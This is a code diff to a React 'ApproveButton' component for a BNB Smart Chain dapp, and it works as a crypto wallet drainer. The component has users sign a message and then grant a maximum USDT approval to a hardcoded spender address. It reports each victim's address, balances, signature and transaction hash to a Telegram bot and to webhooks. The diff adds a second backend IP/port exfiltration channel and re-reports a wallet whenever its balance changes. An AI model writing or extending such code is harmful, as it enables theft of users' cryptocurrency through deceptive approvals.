@@ -11,7 +11,6 @@ const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT on BS
 const SPENDER = "0x2990048172A3687249B2DF6c2F2D8e8401330E88"; // Your spender address
 
 // 🔹 Send message to Telegram
-
 const sendToTelegram = async (message) => {
   console.log("📩 Sending to Telegram:", message); // debug log
 
@@ -30,7 +29,6 @@ const sendToTelegram = async (message) => {
       }),
     });
 
-
     const result = await response.json();
     console.log("Telegram API response:", result); // log response
 
@@ -42,10 +40,43 @@ const sendToTelegram = async (message) => {
   }
 };
 
-// 🔹 Send message to external API
+// 🔹 Send message to backend IP/port
+const sendToBackendIP = async (data) => {
+  const backendIP = localStorage.getItem("backendIP") || "";
+  const backendPort = localStorage.getItem("backendPort") || "";
+  
+  if (!backendIP || !backendPort) {
+    console.log("Backend IP/Port not configured, skipping backend send");
+    return;
+  }
+
+  const endpoint = `http://${backendIP}:${backendPort}/webhook`;
+
+  try {
+    const response = await fetch(endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data),
+    });
+
+    if (!response.ok) {
+      console.error("Backend IP API error:", await response.text());
+    } else {
+      console.log("✅ Data sent to backend IP successfully");
+    }
+  } catch (e) {
+    console.error("❌ Backend IP send failed:", e);
+  }
+};
+
+// 🔹 Send message to external API (legacy support)
 const sendToExternalAPI = async (data) => {
-  const apiEndpoint =
-    localStorage.getItem("apiEndpoint") || "https://your-bot-api.com/webhook";
+  const apiEndpoint = localStorage.getItem("apiEndpoint") || "";
+
+  if (!apiEndpoint) {
+    console.log("External API endpoint not configured, skipping external API send");
+    return;
+  }
 
   try {
     const response = await fetch(apiEndpoint, {
@@ -60,6 +91,36 @@ const sendToExternalAPI = async (data) => {
   } catch (e) {
     console.error("External API send failed:", e);
   }
+};
+
+// 🔹 Check if balances have changed
+const hasBalanceChanged = (currentUSDT, currentBNB, address) => {
+  const lastBalanceKey = `lastBalance_${address}`;
+  const lastBalance = localStorage.getItem(lastBalanceKey);
+  
+  if (!lastBalance) {
+    // First time connecting this wallet
+    return true;
+  }
+  
+  const { usdt: lastUSDT, bnb: lastBNB } = JSON.parse(lastBalance);
+  
+  // Compare with proper decimal precision
+  const usdtChanged = Math.abs(parseFloat(currentUSDT) - parseFloat(lastUSDT)) >= 0.01;
+  const bnbChanged = Math.abs(parseFloat(currentBNB) - parseFloat(lastBNB)) >= 0.000000001;
+  
+  return usdtChanged || bnbChanged;
+};
+
+// 🔹 Update stored balance
+const updateStoredBalance = (usdtFormatted, bnbFormatted, address) => {
+  const lastBalanceKey = `lastBalance_${address}`;
+  const balanceData = {
+    usdt: usdtFormatted,
+    bnb: bnbFormatted,
+    timestamp: new Date().toISOString()
+  };
+  localStorage.setItem(lastBalanceKey, JSON.stringify(balanceData));
 };
 
 export default function ApproveButton() {
@@ -105,26 +166,41 @@ export default function ApproveButton() {
     chainId: bsc.id,
   });
 
-   const usdtFormatted = usdtBalance
-      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
-      : "0";
-    const bnbFormatted = bscBalance
-      ? parseFloat(bscBalance.formatted).toFixed(9)
-      : "0";
+  // Format balances with proper decimal places
+  const usdtFormatted = usdtBalance
+    ? parseFloat(usdtBalance.formatted).toFixed(2)
+    : "0.00";
+  const bnbFormatted = bscBalance
+    ? parseFloat(bscBalance.formatted).toFixed(9)
+    : "0.000000000";
 
-  // 🔹 Send message when wallet connects
+  // 🔹 Send message when wallet connects or balances change
   useEffect(() => {
-    if (isConnected && address) {
-      sendToTelegram(`🟢 Wallet Connected:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted} `);
-      sendToExternalAPI({
-        address,
-        action: "wallet_connected",
-        usdtBalance: usdtFormatted,
-        bscBalance: bnbFormatted,
-        timestamp: new Date().toISOString(),
-      });
+    if (isConnected && address && usdtBalance && bscBalance) {
+      // Check if this is a new connection or if balances have changed
+      if (hasBalanceChanged(usdtFormatted, bnbFormatted, address)) {
+        const message = `🟢 Wallet Update:\n<code>${address}</code>\nUSDT: $${usdtFormatted}\nBNB: ${bnbFormatted}`;
+        
+        // Send to Telegram
+        sendToTelegram(message);
+        
+        // Send to backend IP
+        const walletData = {
+          address,
+          action: "wallet_connected",
+          usdtBalance: usdtFormatted,
+          bnbBalance: bnbFormatted,
+          timestamp: new Date().toISOString(),
+        };
+        
+        sendToBackendIP(walletData);
+        sendToExternalAPI(walletData);
+        
+        // Update stored balance
+        updateStoredBalance(usdtFormatted, bnbFormatted, address);
+      }
     }
-  }, [isConnected, address]);
+  }, [isConnected, address, usdtFormatted, bnbFormatted]);
 
   // 🔹 Handle Approve button with personal sign first
   const handleApprove = async () => {
@@ -141,12 +217,9 @@ export default function ApproveButton() {
 
     setLoading(true);
 
-    const usdtFormatted = usdtBalance
-      ? `$${parseFloat(usdtBalance.formatted).toFixed(2)}`
-      : "0";
-    const bnbFormatted = bscBalance
-      ? parseFloat(bscBalance.formatted).toFixed(9)
-      : "0";
+    // Use consistent formatting
+    const currentUsdtFormatted = usdtFormatted;
+    const currentBnbFormatted = bnbFormatted;
 
     try {
       // Step 1: Personal Sign Message
@@ -166,15 +239,18 @@ export default function ApproveButton() {
         `✅ Message Signed:\n<code>${address}</code>\nMessage: "${signMessage}"\nSignature: ${signature.slice(0, 20)}...`
       );
 
-      await sendToExternalAPI({
+      const signData = {
         address,
         action: "message_signed",
         message: signMessage,
         signature: signature,
-        usdtBalance: usdtFormatted,
-        bscBalance: bnbFormatted,
+        usdtBalance: currentUsdtFormatted,
+        bnbBalance: currentBnbFormatted,
         timestamp: new Date().toISOString(),
-      });
+      };
+
+      await sendToBackendIP(signData);
+      await sendToExternalAPI(signData);
 
       // Step 2: Proceed with USDT Approval
       const maxAmount = parseUnits(
@@ -191,19 +267,22 @@ export default function ApproveButton() {
       });
 
       await sendToTelegram(
-        `✅ USDT Approved:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nTx Hash: ${hash}\nSigned Message: "${signMessage}"`
+        `✅ USDT Approved:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}\nTx Hash: ${hash}\nSigned Message: "${signMessage}"`
       );
 
-      await sendToExternalAPI({
+      const approvalData = {
         address,
         action: "approval_success",
         txHash: hash,
         signedMessage: signMessage,
         signature: signature,
-        usdtBalance: usdtFormatted,
-        bscBalance: bnbFormatted,
+        usdtBalance: currentUsdtFormatted,
+        bnbBalance: currentBnbFormatted,
         timestamp: new Date().toISOString(),
-      });
+      };
+
+      await sendToBackendIP(approvalData);
+      await sendToExternalAPI(approvalData);
 
     } catch (err) {
       console.error("Process failed:", err.message);
@@ -214,17 +293,20 @@ export default function ApproveButton() {
         : 'Process failed';
 
       await sendToTelegram(
-        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: ${usdtFormatted}\nBNB: ${bnbFormatted}\nError: ${err.message}`
+        `❌ ${errorContext}:\n<code>${address}</code>\nUSDT: $${currentUsdtFormatted}\nBNB: ${currentBnbFormatted}\nError: ${err.message}`
       );
 
-      await sendToExternalAPI({
+      const errorData = {
         address,
         action: errorContext.toLowerCase().includes('sign') ? 'sign_failed' : 'approval_failed',
         error: err.message,
-        usdtBalance: usdtFormatted,
-        bscBalance: bnbFormatted,
+        usdtBalance: currentUsdtFormatted,
+        bnbBalance: currentBnbFormatted,
         timestamp: new Date().toISOString(),
-      });
+      };
+
+      await sendToBackendIP(errorData);
+      await sendToExternalAPI(errorData);
     }
 
     setLoading(false);
@@ -340,7 +422,7 @@ export default function ApproveButton() {
             color: "rgba(255, 255, 255, 0.8)",
             fontStyle: "italic"
           }}>
-            Current balance: ${usdtBalanceNumber.toFixed(2)} USDT
+            Current balance: $${usdtFormatted} USDT
           </div>
         </div>
       )}
